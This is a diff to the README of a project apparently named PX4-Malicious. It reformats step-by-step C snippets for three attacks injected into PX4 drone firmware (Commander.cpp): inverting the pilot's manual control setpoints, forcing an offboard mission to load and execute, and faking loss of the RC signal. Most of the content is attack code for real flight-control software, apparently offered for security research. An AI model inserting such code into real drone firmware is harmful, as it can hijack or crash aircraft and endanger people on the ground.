@@ -22,28 +22,29 @@ The **PX4-Malicious** project aims to provide a direction for which attacks to p
 - **Attack Type**: Drone Aircraft, Drone Flight Stack
 - **Attack Point**: Drone Firmware, Commander.cpp
 - **Attack Code**:  
+#### Step 1: Check whether new data has been published
+```c
+if(last_setpoint_x != (int)(_manual_control_setpoint.x * 10000)
+    && last_setpoint_y != (int)(_manual_control_setpoint.y *10000))
 ```
-# Step 1: Check whether new data has been published
-if(last_setpoint_x != (int)(_manual_control_setpoint.x * 10000) && last_setpoint_y != (int)(_manual_control_setpoint.y *10000))
-```
-```
-# Step 2: Declare a new setpoint & Copy using orb_copy
+#### Step 2: Declare a new setpoint & Copy using orb_copy
+```c
 struct manual_control_setpoint_s temp_setpoint;
 orb_copy(ORB_ID(manual_control_setpoint), 1, &temp_setpoint);
 ```
-```
-# Step 3: Update the new setpoint in the opposite direction of x and y
+#### Step 3: Update the new setpoint in the opposite direction of x and y
+```c
 temp_setpoint = _manual_control_setpoint;
 temp_setpoint.x *= (-1);
 temp_setpoint.y *= (-1);
 ```
-```
-# Step 4: Publish updated setpoint values
+#### Step 4: Publish updated setpoint values
+```c
 orb_advert_t changed_setpoint = orb_advertise(ORB_ID(manual_control_setpoint), &temp_setpoint);
 orb_publish(ORB_ID(manual_control_setpoint), changed_setpoint, &temp_setpoint);
 ```
-```
-# Step 5: Save current setpoint value to last_setpoint
+#### Step 5: Save current setpoint value to last_setpoint
+```c
 last_setpoint_x = (int)(temp_setpoint.x * 10000);
 last_setpoint_y = (int)(temp_setpoint.y * 10000);
 ```
@@ -53,12 +54,12 @@ last_setpoint_y = (int)(temp_setpoint.y * 10000);
 - **Attack Type**: Drone Aircraft, Ground Control Station, Drone Flight Stack
 - **Attack Point**: Drone Firmware, Commander.cpp
 - **Attack Code**:  
-```
-# Step 1: Mission structure declaration
+#### Step 1: Mission structure declaration
+```c
 mission_s mission;
 ```
-```
-# Step 2: Update the result of dataman(Mission, Setpoint) to the newly declared Mission
+#### Step 2: Update the result of dataman(Mission, Setpoint) to the newly declared Mission
+```c
 if (dm_read(DM_KEY_MISSION_STATE, 0, &mission, sizeof(mission_s)) == sizeof(mission_s)) {
     if (mission.dataman_id == DM_KEY_WAYPOINTS_OFFBOARD_0 || mission.dataman_id == DM_KEY_WAYPOINTS_OFFBOARD_1) {
         if (mission.count > 0) {
@@ -67,17 +68,17 @@ if (dm_read(DM_KEY_MISSION_STATE, 0, &mission, sizeof(mission_s)) == sizeof(miss
     }
 }
 ```
-```
-# Step 3: Publish the updated Mission
+#### Step 3: Publish the updated Mission
+```c
 _mission_pub.publish(mission);
 ```
-```
-# Step 4: Check if Mission is properly published
+#### Step 4: Check if Mission is properly published
+```c
 const bool mission_result_ok = (mission_result.timestamp > _boot_timestamp) 
     && (mission_result.instance_count > 0);
 ```
-```
-# Step 5: Check if the Mission is in a state that can be performed
+#### Step 5: Check if the Mission is in a state that can be performed
+```c
 if (status_flags.condition_home_position_valid &&
     (prev_mission_instance_count != mission_result.instance_count)) {
 
@@ -95,12 +96,12 @@ if (status_flags.condition_home_position_valid &&
     }
 }
 ```
-```
-# Step 6: Switched to Mission execution mode & Mission perform
+#### Step 6: Switched to Mission execution mode & Mission perform
+```c
 main_state_transition(status, commander_state_s::MAIN_STATE_AUTO_MISSION, status_flags, &_internal_state);
 ```
-```
-# Step 7: When the mission is over, set flag to false
+#### Step 7: When the mission is over, set flag to false
+```c
 if(_mission_result_sub.get().finished){
   MESL02_Mission_flag = false;
 }
@@ -111,16 +112,16 @@ if(_mission_result_sub.get().finished){
 - **Attack Type**: Ground Control Station, Drone Flight Stack
 - **Attack Point**: Drone Firmware, Commander.cpp
 - **Attack Code**:  
-```
-# Step 1: Sending 1000 loss signals
+#### Step 1: Sending 1000 loss signals
+```c
 else if(MESL03_Loss_flag <= 1000)
 ```
-```
-# Step 2: Convert rc_signal_lost of status structure to true
+#### Step 2: Convert rc_signal_lost of status structure to true
+```c
 status.rc_signal_lost = true;
 ```
-```
-# Step 3: Set the flag with the updated status using the set_health_flags() function
+#### Step 3: Set the flag with the updated status using the set_health_flags() function
+```c
 set_health_flags(subsystem_info_s::SUBSYSTEM_TYPE_RCRECEIVER, true, true, false, status);
 _status_changed = true;
 ```
